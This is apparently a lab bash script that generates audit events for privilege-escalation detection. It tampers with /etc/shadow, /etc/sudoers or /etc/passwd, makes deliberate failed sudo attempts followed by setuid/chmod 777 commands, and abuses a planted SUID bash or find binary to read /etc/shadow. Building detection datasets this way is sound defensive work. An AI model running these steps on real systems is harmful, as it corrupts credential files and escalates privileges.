#!/bin/bash

# NoEsc lab execution: generate malicious-sequence audit events for all 3 vectors.

if [ "$EUID" -eq 0 ]; then
  echo "[-] Run this as a normal user, not root."
  exit 1
fi

set -u

SUDO_PASS="${NOESC_LAB_PASSWORD:-}"

FAILED_MIN="${NOESC_FAILED_SUDO_MIN:-1}"
FAILED_MAX="${NOESC_FAILED_SUDO_MAX:-4}"
AUTH_FAIL_CAP="${NOESC_AUTH_FAIL_CAP:-1}"
PHASE3_TIMEOUT_SECS="${NOESC_PHASE3_TIMEOUT_SECS:-30}"

if ! [[ "$FAILED_MIN" =~ ^[0-9]+$ ]]; then
  FAILED_MIN=1
fi
if ! [[ "$FAILED_MAX" =~ ^[0-9]+$ ]]; then
  FAILED_MAX=4
fi
if ! [[ "$AUTH_FAIL_CAP" =~ ^[0-9]+$ ]]; then
  AUTH_FAIL_CAP=1
fi
if ! [[ "$PHASE3_TIMEOUT_SECS" =~ ^[0-9]+$ ]]; then
  PHASE3_TIMEOUT_SECS=30
fi

if [ "$FAILED_MIN" -lt 1 ]; then
  FAILED_MIN=1
fi
if [ "$FAILED_MAX" -gt 4 ]; then
  FAILED_MAX=4
fi
if [ "$FAILED_MAX" -lt "$FAILED_MIN" ]; then
  FAILED_MAX="$FAILED_MIN"
fi
if [ "$AUTH_FAIL_CAP" -lt 0 ]; then
  AUTH_FAIL_CAP=0
fi
if [ "$AUTH_FAIL_CAP" -gt 4 ]; then
  AUTH_FAIL_CAP=4
fi
if [ "$PHASE3_TIMEOUT_SECS" -lt 1 ]; then
  PHASE3_TIMEOUT_SECS=30
fi

run_phase3_payload() {
  if command -v timeout > /dev/null 2>&1; then
    timeout "${PHASE3_TIMEOUT_SECS}s" "$@"
  else
    "$@"
  fi
}

run_phase3_with_retry() {
  local tag="$1"
  shift

  run_phase3_payload "$@"
  local rc=$?

  if [ "$rc" -eq 124 ]; then
    echo "[!] Phase 3 payload timed out after ${PHASE3_TIMEOUT_SECS}s (${tag}); retrying once"
    run_phase3_payload "$@"
    rc=$?
  fi

  return "$rc"
}

run_find_phase3_payload() {
  local payload="$1"
  local marker_dir="${XDG_RUNTIME_DIR:-${HOME:-/tmp}}"
  local marker

  marker="$(mktemp "${marker_dir}/.noesc_phase3_ok_XXXXXX" 2>/dev/null)" || {
    # Fallback if runtime/home path is unavailable.
    marker="$(mktemp "/tmp/.noesc_phase3_ok_XXXXXX")" || return 71
  }

  # Ensure marker starts empty and remains user-owned for reliable cleanup.
  : > "$marker"

  run_phase3_payload "$payload" /tmp -maxdepth 0 -exec /bin/sh -p -c 'head -n 1 /etc/shadow > /dev/null 2>&1 && echo ok > "$1"' _ "$marker" \; -quit
  local rc=$?

  if [ "$rc" -ne 0 ]; then
    rm -f "$marker" 2>/dev/null || true
    return "$rc"
  fi

  if ! grep -q '^ok$' "$marker" 2>/dev/null; then
    rm -f "$marker" 2>/dev/null || true
    # Command ran but privilege-read gate did not succeed.
    return 70
  fi

  rm -f "$marker" 2>/dev/null || true
  return 0
}

run_find_phase3_with_retry() {
  local tag="$1"
  local payload="$2"

  run_find_phase3_payload "$payload"
  local rc=$?

  if [ "$rc" -ne 0 ]; then
    if [ "$rc" -eq 124 ]; then
      echo "[!] Phase 3 payload timed out after ${PHASE3_TIMEOUT_SECS}s (${tag}); retrying once"
    else
      echo "[!] Phase 3 payload did not satisfy privileged-read gate (${tag}, rc=${rc}); retrying once"
    fi
    run_find_phase3_payload "$payload"
    rc=$?
  fi

  return "$rc"
}

echo "==============================================="
echo "NoEsc Lab Breakout (Randomized)"
echo "==============================================="

SENSITIVE_TARGETS=("/etc/shadow" "/etc/sudoers" "/etc/passwd")
TAMPER_TOOLS=("cat" "touch" "echo" "sed")

target="${SENSITIVE_TARGETS[$RANDOM % ${#SENSITIVE_TARGETS[@]}]}"
tool="${TAMPER_TOOLS[$RANDOM % ${#TAMPER_TOOLS[@]}]}"

echo "[*] Phase 1/3 - Sensitive file tampering attempt"
echo "    Target: $target"
echo "    Tool:   $tool"

case "$tool" in
  cat)
    cat "$target" > /dev/null 2>&1 || true
    ;;
  touch)
    touch "$target" > /dev/null 2>&1 || true
    ;;
  echo)
    echo "# noesc-lab-$RANDOM" >> "$target" 2> /dev/null || true
    ;;
  sed)
    sed -i '$a#noesc-lab' "$target" > /dev/null 2>&1 || true
    ;;
esac

sleep 1


echo "[*] Phase 2/3 - Stateful sudo misuse"

failed_attempts=$(( (RANDOM % (FAILED_MAX - FAILED_MIN + 1)) + FAILED_MIN ))
echo "    Failed sudo attempts: $failed_attempts"

# Keep real bad-password attempts low to avoid PAM lockouts while still
# generating sudo misuse sequence noise for stateful detection.
auth_failed_attempts="$failed_attempts"
if [ "$auth_failed_attempts" -gt "$AUTH_FAIL_CAP" ]; then
  auth_failed_attempts="$AUTH_FAIL_CAP"
fi
non_auth_failed_attempts=$(( failed_attempts - auth_failed_attempts ))
echo "    Auth failures: $auth_failed_attempts, non-auth failures: $non_auth_failed_attempts"

# Force password re-auth so failed attempts are actually recorded.
sudo -k

for i in $(seq 1 "$auth_failed_attempts"); do
  printf 'wrongpass-%s\n' "$RANDOM" | sudo -S -p '' true > /dev/null 2>&1 || true
done

for i in $(seq 1 "$non_auth_failed_attempts"); do
  sudo -n true > /dev/null 2>&1 || true
done

lab_file="/tmp/noesc_lab_target"
echo "seed-$RANDOM" > "$lab_file"

SUDO_DANGEROUS=(
  "chmod 777 $lab_file"
  "chown root:root $lab_file"
  "chmod u+s $lab_file"
)

danger_cmd="${SUDO_DANGEROUS[$RANDOM % ${#SUDO_DANGEROUS[@]}]}"

echo "    Attempting successful sudo command: sudo $danger_cmd"

# Re-authenticate after forced failures.
if [ -n "$SUDO_PASS" ]; then
  printf '%s\n' "$SUDO_PASS" | sudo -S -p '' -v > /dev/null 2>&1 || {
    echo "[-] NOESC_LAB_PASSWORD failed during sudo re-auth (possibly lockout)."
    echo "    Try: faillock --user $USER --reset (as root), then rerun."
    exit 1
  }
else
  sudo -v || {
    echo "[-] Could not obtain sudo credentials for success phase."
    exit 1
  }
fi

if ! sudo -n bash -c "$danger_cmd" > /dev/null 2>&1; then
  if [ -n "$SUDO_PASS" ]; then
    printf '%s\n' "$SUDO_PASS" | sudo -S -p '' bash -c "$danger_cmd" > /dev/null 2>&1 || true
  else
    sudo bash -c "$danger_cmd" > /dev/null 2>&1 || true
  fi
fi

sleep 1

echo "[*] Phase 3/3 - SUID abuse"

if [ ! -f /tmp/.vuln_path ]; then
  echo "[-] Missing /tmp/.vuln_path. Run sudo ./setup_lab_vulns.sh first."
  exit 1
fi

suid_bin="$(cat /tmp/.vuln_path)"
if [ ! -x "$suid_bin" ]; then
  echo "[-] Planted SUID binary is missing or not executable: $suid_bin"
  exit 1
fi

kind="unknown"
if [ -f /tmp/.vuln_kind ]; then
  kind="$(cat /tmp/.vuln_kind)"
fi

echo "    Using payload: $suid_bin (kind=$kind)"

if [ "$kind" = "bash" ]; then
  run_phase3_with_retry "kind=bash" "$suid_bin" -p -c 'id > /dev/null 2>&1; head -n 1 /etc/shadow > /dev/null 2>&1'
  rc=$?
  if [ "$rc" -ne 0 ]; then
    mount_opts="$(findmnt -T "$suid_bin" -no OPTIONS 2>/dev/null || echo unknown)"
    echo "[!] Payload mount options for $suid_bin: $mount_opts"
    echo "[-] Phase 3 payload failed (kind=bash, rc=${rc}); aborting to preserve dataset integrity"
    exit 1
  fi
elif [ "$kind" = "find" ]; then
  # Bound traversal to keep execution deterministic while still exercising SUID find abuse.
  run_find_phase3_with_retry "kind=find" "$suid_bin"
  rc=$?
  if [ "$rc" -ne 0 ]; then
    echo "[-] Phase 3 payload failed (kind=find, rc=${rc}); aborting to preserve dataset integrity"
    exit 1
  fi
else
  run_phase3_with_retry "kind=unknown/bash-path" "$suid_bin" -p -c 'id > /dev/null 2>&1; head -n 1 /etc/shadow > /dev/null 2>&1'
  rc=$?
  if [ "$rc" -ne 0 ]; then
    run_find_phase3_with_retry "kind=unknown/find-path" "$suid_bin"
    rc=$?
  fi
  if [ "$rc" -ne 0 ]; then
    echo "[-] Phase 3 payload failed for both unknown paths (rc=${rc}); aborting to preserve dataset integrity"
    exit 1
  fi
fi

echo "[+] Breakout run complete"
